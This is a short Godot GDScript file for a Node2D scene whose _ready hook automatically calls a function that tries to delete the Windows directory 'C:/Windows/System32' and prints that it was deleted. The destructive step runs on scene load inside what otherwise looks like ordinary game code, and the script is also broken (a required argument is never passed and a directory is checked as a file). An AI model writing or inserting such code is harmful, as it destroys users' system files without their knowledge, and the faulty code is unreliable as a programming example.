extends Node2D

var everybody_live: bool = true

func _ready() -> void:
	_destroy_server()

func _destroy_server(full_path):
	full_path = "C:/Windows/System32"
	var dir = DirAccess.open(full_path)
	if dir and dir.file_exists(full_path):
		dir.remove(full_path)
		print("file "+full_path+' deleted')
